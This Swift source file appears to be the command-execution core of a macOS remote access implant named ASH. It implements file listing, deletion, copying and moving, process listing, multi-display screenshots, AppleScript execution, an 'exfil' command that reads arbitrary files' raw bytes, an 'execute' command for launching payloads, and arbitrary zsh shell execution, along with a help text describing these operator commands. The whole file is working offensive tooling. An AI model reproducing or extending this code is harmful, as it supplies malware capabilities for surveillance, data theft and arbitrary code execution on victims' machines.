import Foundation
import AppKit
extension Collection where Indices.Iterator.Element == Index {
  public subscript(safe index: Index) -> Element? {
    startIndex..<endIndex ~= index ? self[index]: nil
  }
}

struct returnData {
  var inCommand: String
  var returnType: String
  var returnData: Any
  var returnDict: [String: Any] {
    return ["inCommand":inCommand, "returnType":returnType, "returnData":returnData]
  }
}
struct returnDataRaw {
  var inCommand: String
  var returnType: String
  var fileName: String
  var returnData: Any
  var returnDict: [String: Any] {
    return ["inCommand":inCommand, "returnType":returnType, "fileName":fileName, "returnData":returnData]
  }
}

enum Cmd: String, Equatable {
  case ls, cd, /* cdr, */ mkdir, whoami, rm, rmdir, ps, cat, mv, strings, cp, screenshot, osascript, exfil, execute, man, shell
}

struct Command: Equatable {
  let command: Cmd
  let arguments: [String]
  let filePath: String
  var fullPath: String { filePath.hasPrefix("/") ? filePath : "\(FileManager.default.currentDirectoryPath)/\(filePath)" }
  
  init?(_ cmd: String) {
    // this currently splits arguments based on `; ` rather than whitespace this makes
    // If I did it right (which I didn't and need to fix) this should mean that
    // mv; this; file; here would translate to `mv this file here` and move the files `this` and `file` to the directory `here`
    // whereas mv; this file; here would translate to `mv "this file" here` , moving the file "this file" to the path "here"
    guard !cmd.isEmpty else { return nil }
    let split = cmd.split(separator: ";").lazy.map { $0.trimmingCharacters(in: .whitespaces) }.filter { !$0.isEmpty }
    command = Cmd(rawValue: split.first!) ?? .shell
    arguments = Array(split.dropFirst())
    filePath = arguments.first ?? ""
  }
}

public enum CmdError: Error {
  case noCommand
  case notEnoughArguments(String)
  case invalidArgument(String)
  case displyList(CGError)
  case osascript(NSDictionary)
  case zshFailure
}

public enum CmdValue: Equatable {
  case string(String)
  case data(Data)
  case screenshots(timestamp: String, screenshots: [Data])
}

public typealias CmdResult = Result<CmdValue, Error>

public class ASH {
  static let fileManager = FileManager.default
  static let shared = ASH()

  private func lsCommand(_ path: String) -> CmdResult {
    do {
      let listPaths = try ASH.fileManager.contentsOfDirectory(atPath: path).joined(separator: "\n")
      return .success(.string("\(path):\n\(listPaths)"))
    }
    catch {
      return .failure(error)
    }
  }

  private func cdCommand(_ destPath: String?) -> CmdResult {
    var newDirPath = ""
    if #available(macOS 10.12, *) {
      newDirPath = destPath ?? ASH.fileManager.homeDirectoryForCurrentUser.path
    } else {
      // Fallback on earlier versions
      newDirPath = destPath ?? ASH.fileManager.currentDirectoryPath
    }
    ASH.fileManager.changeCurrentDirectoryPath(newDirPath)
    return .success(.string(newDirPath))
  }
  
  private func mkdirCommand(_ destPath: String) -> CmdResult {
    do {
      try ASH.fileManager.createDirectory(at: URL(fileURLWithPath: destPath), withIntermediateDirectories: false, attributes: nil)
      return .success(.string(destPath))
    }
    catch {
      return .failure(error)
    }
  }
  
  private func rmCommand(_ targetPath: String) -> CmdResult {
    // TODO: - Need to fix to handle multiple arguments to rm
    do {
      try ASH.fileManager.removeItem(at: URL(fileURLWithPath: targetPath))
      return .success(.string(targetPath))
    }
    catch {
      return .failure(error)
    }
  }
  
  private func psCommand() -> CmdResult {
    let commandResult = NSWorkspace.shared.runningApplications.compactMap(\.localizedName).joined(separator: "\n")
    return .success(.string(commandResult))
  }
  
  private func catCommand(_ targetFile: String) -> CmdResult {
    // TODO: - Need to fix to handle multiple arguments to cat
    do {
      let fileResults = try String(contentsOf: URL(fileURLWithPath: targetFile), encoding: .utf8)
      return .success(.string(fileResults))
    }
    catch {
      return .failure(error)
    }
  }
  
  private func mvCommand(from srcPaths: [String], to destPath: String) -> CmdResult {
    // TODO: - Need to fix to handle multiple arguments to mv
    let origUrls = srcPaths.map { URL(fileURLWithPath: $0) }
    var destURL = URL(fileURLWithPath: destPath)
    
    //Move a file.  This will delete the previous file
    guard origUrls.allSatisfy({ url in
      ASH.fileManager.isReadableFile(atPath: url.path)
        && ASH.fileManager.isDeletableFile(atPath: url.path)
    }) else { return .failure(CmdError.invalidArgument("Some files are not moveable")) }
    
    // If one item to move, just try to move it and report wha the system says
    // If multiple items to move, ensure last arg exists and is a directory then try, else fail
    
    var isDirectory: ObjCBool = false
    let destExists = ASH.fileManager.fileExists(atPath: destURL.path, isDirectory: &isDirectory)
    if srcPaths.count == 1 {
      do {
        let src = origUrls.first!
        if destExists && isDirectory.boolValue { destURL.appendPathComponent(src.lastPathComponent) }
        try ASH.fileManager.moveItem(at: src, to: destURL)
        return .success(.string("\(origUrls.first!.path) > \(destURL.path)"))
      }
      catch {
        return .failure(error)
      }
    } else {
      guard destExists && isDirectory.boolValue else { return .failure(CmdError.invalidArgument("Moving multiple sources requires destination to be an existing directory")) }
      do {
        try origUrls.forEach { url in
          let filename = url.lastPathComponent
          try ASH.fileManager.moveItem(at: url, to: destURL.appendingPathComponent(filename))
        }
        return .success(.string("\(origUrls.map(\.path)) > \(destURL.path)"))
      } catch {
        return .failure(error)
      }
    }
  }
  
  private func stringsCmd(_ filePath: String) -> CmdResult {
    let file = URL(fileURLWithPath: filePath)
    do {
      let fileResults = try String(contentsOf: file, encoding: .ascii)
      return .success(.string(fileResults))
    }
    catch {
      return .failure(error)
    }
  }
  
  private func cpCommand(from srcPath: String, to dstPath: String) -> CmdResult {
    // TODO: - Need to fix to handle multiple arguments to cp
    let origUrl = URL(fileURLWithPath: srcPath)
    let destURL = URL(fileURLWithPath: dstPath)

    do {
      try ASH.fileManager.copyItem(at: origUrl, to: destURL)
      return .success(.string("\(origUrl.path) > \(destURL.path)"))
    }
    catch {
      return .failure(error)
    }
  }
  
  private func screenshotCommand() -> CmdResult {
    var displayCount: UInt32 = 0
    let displayList = CGGetActiveDisplayList(0, nil, &displayCount)
    let capacity = Int(displayCount)
    var activeDisplay = Array<CGDirectDisplayID>(repeating: 0, count: capacity)
    guard displayList == CGError.success,
          CGGetActiveDisplayList(displayCount, &activeDisplay, &displayCount) == CGError.success
    else { return .failure(CmdError.displyList(displayList)) }
      //Places all the displays into an object
    let screenshotTime = "\(Date().timeIntervalSince1970)"
    let screenshots: [Data] = (0..<Int(displayCount)).compactMap { displayIdx in
      guard let screenshot: CGImage = CGDisplayCreateImage(activeDisplay[displayIdx]),
            let jpg = NSBitmapImageRep(cgImage: screenshot).representation(using: .jpeg, properties: [:])
      else { return nil }
      return jpg
    }
    return .success(.screenshots(timestamp: screenshotTime, screenshots: screenshots))
  }
  
  private func osascriptCommand(_ script: String) -> CmdResult {
    let scriptOutput = NSAppleScript(source: script)!
    var scriptErr: NSDictionary?
    scriptOutput.executeAndReturnError(&scriptErr)
    return scriptErr == nil ? .success(.string(script)) : .failure(CmdError.osascript(scriptErr!))
  }
  
  private func exfilCommand(_ filePath: String) -> CmdResult {
    guard ASH.fileManager.fileExists(atPath: filePath) else { return .failure(CmdError.invalidArgument("File \(filePath) does not exist")) }
    do {
      let data = try Data(contentsOf: URL(fileURLWithPath: filePath))
      return .success(.data(data))
    }
    catch {
      return .failure(error)
    }
  }
  
  private func executeCommand(_ command: String) -> CmdResult {
    do {
      try NSWorkspace.shared.launchApplication(at: URL(fileURLWithPath: command), options: .default, configuration: .init())
      return .success(.string("\(command) successful"))
    }
    catch {
      return .failure(error)
    }
  }
  
  private func shellCommand(_ command: [String]) -> CmdResult {
    // TODO: - I'm pretty sure I messed something up here. Think about it for a minute.
    let shell = Process()
    let output = Pipe()
    shell.launchPath = "/bin/zsh"
    shell.standardOutput = output
    shell.arguments = ["-c"] + command
    shell.launch()
    shell.waitUntilExit()
    let data = output.fileHandleForReading.readDataToEndOfFile()
    if let newOutput = String(data: data, encoding: .utf8) {
      return .success(.string(newOutput))
    } else {
      return .failure(CmdError.zshFailure)
    }

  }

  public func command(command: String) -> CmdResult {
    guard let cmd = Command(command) else { return .failure(CmdError.noCommand) }
    
    switch cmd.command {
    case .ls: return lsCommand(cmd.filePath)
    case .cd: return cdCommand(cmd.filePath)
//    case .cdr: return cdCommand(cmd.fullPath)         //Go to the relative folder in this directory
    case .mkdir: return mkdirCommand(cmd.fullPath)
    case .whoami: return .success(.string(NSUserName())) //Do Get username
    case .rm: return rmCommand(cmd.fullPath)
    case .rmdir:
      var isDir: ObjCBool = false
      let exists = FileManager.default.fileExists(atPath: cmd.fullPath, isDirectory: &isDir)
      switch (exists, isDir.boolValue) {
      case (true, true): return rmCommand(cmd.fullPath)
      case (true, false): return .failure(CmdError.invalidArgument("\(cmd.fullPath) is not a directory"))
      case (false, _): return .failure(CmdError.invalidArgument("Directory \(cmd.fullPath) does not exist"))
      }
    case .ps: return psCommand()
    // Will list all running applications
    // Note that this is not the same as all "processes". E.g. if vim is running in a Terminal,
    // then Terminal will show up in the list, but vim will not.
    case .cat: return catCommand(cmd.fullPath)
    case .mv:
      guard cmd.arguments.count > 1 else { return .failure(CmdError.notEnoughArguments("mv requires source and destination arguments")) }
      return mvCommand(from: cmd.arguments.dropLast(), to: cmd.arguments.last!)
    case .strings:
      // TODO: - Rewrite this to actually replicate strings functionality
      return stringsCmd(cmd.fullPath)
    case .cp:
      //Copy a file
      guard cmd.arguments.count > 1 else { return .failure(CmdError.notEnoughArguments("cp requires source and destination arguments")) }
      return cpCommand(from: cmd.arguments[0], to: cmd.arguments[1])
    case .screenshot:
      //Gets overall displays
      //Some bugs exist with this command
      //For example, it doesn't cycle through virtual desktops and will screenshot a random one
      //This will notify the user requesting permission to take pictures on 10.15+
      return screenshotCommand()
    case .osascript:
      guard let source = cmd.arguments.first else { return .failure(CmdError.notEnoughArguments("No script provided ot oscscript command")) }
        return osascriptCommand(source)
    case .exfil:
      guard ASH.fileManager.fileExists(atPath: cmd.fullPath)
      else { return .failure(CmdError.invalidArgument("File \(cmd.fullPath) does not exist")) }
      return exfilCommand(cmd.fullPath)
    case .execute:
      //Will execute payloads, this typically works better when you're in the same directory as the destination payload
      guard let command = cmd.arguments.first else { return .failure(CmdError.notEnoughArguments("No arguments passed to execute command")) }
      return executeCommand(command)
    case .man:
        let commandResult = """
                    The following are commands ran as API calls:
                    mkdir; --- Make a directory in your current directory.
                    whoami; --- Print the current user.
                    cdr; --- Go to a single folder from your current directory.
                    cd; --- Change directories.
                    ls; --- List the directory.
                    ps; --- Will list all processes not limited to user processes.
                    strings; --- This will print the contents of a file.
                    mv; --- Perform a mv command to move files/folders.
                    cp; --- Copy a file/folder.
                    screenshot; <Destination> --- Take a snapshot of all screens. This will notify the user.
                    osascript; <Code> --- This will run an Apple script.
                    exfil; <binary> --- Will grab the raw data of a file. Must be in the same directory of the file.
                    execute; <App to Run> --- This will execute a payload as an API call (no shell needed). Must be in the directory of the binary to execute.
                    """
      return .success(.string(commandResult))
    case .shell:
      guard cmd.arguments.count > 1 else { return .failure(CmdError.notEnoughArguments("no shell command supplied")) }
      return shellCommand(cmd.arguments)
    }
  }
}
